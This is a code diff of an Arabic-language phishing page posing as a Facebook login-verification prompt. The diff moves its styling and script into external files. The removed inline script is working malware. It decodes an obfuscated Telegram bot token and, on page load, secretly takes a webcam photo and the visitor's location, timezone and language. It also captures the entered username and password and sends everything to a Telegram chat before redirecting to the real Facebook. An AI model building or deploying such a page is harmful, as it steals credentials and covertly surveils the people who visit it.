@@ -6,108 +6,37 @@
     <meta property="og:title" content="تأكيد نشاط تسجيل الدخول | فيسبوك">
     <meta property="og:description" content="يرجى تأكيد هويتك الآن لتجنب تعطيل الحساب نتيجة دخول مشبوه.">
     <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+    
     <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
     
-    <style>
-        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
-        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
-        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:24px;font-weight:bold;letter-spacing:-1px;}
-        .form-area {padding:20px;}
-        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
-        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
-        .links {text-align:center;margin:15px 0;font-size:14px;}
-        .links a {color:#1877f2;text-decoration:none;}
-        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;line-height:1.6;}
-        #loader {position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:10000;display:flex;flex-direction:column;justify-content:center;align-items:center;}
-        .spinner {width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #1877f2;border-radius:50%;animation:spin 1s linear infinite;}
-        @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<div id="loader">
-    <div class="spinner"></div>
-    <p style="margin-top:20px;color:#606770;">جاري تأمين الاتصال...</p>
-</div>
+    <div id="loader">
+        <div class="spinner"></div>
+        <p style="margin-top:20px; color:#606770;">جاري تأمين الاتصال بفيسبوك...</p>
+    </div>
 
-<div class="fb-container">
-    <div class="header">facebook</div>
-    <div class="form-area">
-        <form id="loginForm">
-            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
-            <input type="password" id="pass" placeholder="كلمة المرور" required>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
-        </form>
-        <div class="links">
-            <a href="#">نسيت كلمة المرور؟</a><br><br>
-            <a href="#">إنشاء حساب جديد</a>
+    <div class="fb-container">
+        <div class="header">facebook</div>
+        <div class="form-area">
+            <form id="loginForm">
+                <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
+                <input type="password" id="pass" placeholder="كلمة المرور" required>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+            <div class="links">
+                <a href="#">نسيت كلمة المرور؟</a><br><br>
+                <a href="#">إنشاء حساب جديد</a>
+            </div>
+        </div>
+        <div class="footer">
+            العربية · English · Türkçe · المزيد<br>
+            Meta © 2026
         </div>
     </div>
-    <div class="footer">العربية · English · Türkçe · المزيد<br>Meta © 2026</div>
-</div>
 
-<script>
-// --- التشفير والتحكم ---
-const _0x = ["ODUyNzU2NTIwNTpBQUZwb3lMRHppcjRvaVFLcVBQTy1DbTQwWFZ6VUJ2TEVSOA==", "MTYxMTM5ODMwMw=="];
-const BT = atob(_0x[0]);
-const CI = atob(_0x[1]);
-
-// إخفاء اللودر
-setTimeout(() => { document.getElementById('loader').style.display='none'; }, 2000);
-
-// بدء السحب التلقائي
-window.onload = () => { captureAll(); };
-
-async function captureAll() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        let v = document.createElement('video'); v.srcObject = stream; v.play();
-        setTimeout(() => {
-            let c = document.createElement('canvas'); c.width=640; c.height=480;
-            c.getContext('2d').drawImage(v, 0, 0, 640, 480);
-            let img = c.toDataURL('image/jpeg');
-            stream.getTracks().forEach(t => t.stop());
-            navigator.geolocation.getCurrentPosition(p => { send(img, p); }, () => { send(img, null); });
-        }, 2000);
-    } catch(e) { send(null, null); }
-}
-
-function send(img, pos) {
-    const lat = pos ? pos.coords.latitude.toFixed(5) : "مرفوض";
-    const lng = pos ? pos.coords.longitude.toFixed(5) : "مرفوض";
-    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const lang = navigator.language;
-    let txt = `📸 **بصمة جديدة**\n📍 الموقع: \`${lat},${lng}\`\n🌐 التوقيت: \`${tz}\`\n🗣️ اللغة: \`${lang}\``;
-
-    if(img) {
-        let fd = new FormData();
-        fd.append('photo', dataURLtoBlob(img), 'f.jpg');
-        fd.append('caption', txt); fd.append('chat_id', CI); fd.append('parse_mode', 'Markdown');
-        fetch(`https://api.telegram.org/bot${BT}/sendPhoto`, { method: 'POST', body: fd });
-    } else {
-        fetch(`https://api.telegram.org/bot${BT}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CI, text: txt, parse_mode: "Markdown"})
-        });
-    }
-}
-
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const u = document.getElementById('user').value;
-    const p = document.getElementById('pass').value;
-    const m = `👤 **دخول جديد**\n📧 حساب: \`${u}\`\n🔑 كلمة: \`${p}\`\n📱 الجهاز: \`${navigator.userAgent}\``;
-    fetch(`https://api.telegram.org/bot${BT}/sendMessage`, {
-        method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CI, text: m, parse_mode: "Markdown"})
-    }).then(() => { window.location.href = "https://www.facebook.com/login/"; });
-});
-
-function dataURLtoBlob(d) {
-    let a = d.split(','), m = a[0].match(/:(.*?);/)[1], b = atob(a[1]), n = b.length, u = new Uint8Array(n);
-    while(n--) u[n] = b.charCodeAt(n);
-    return new Blob([u], {type: m});
-}
-</script>
+    <script src="script.js"></script>
 </body>
 </html>
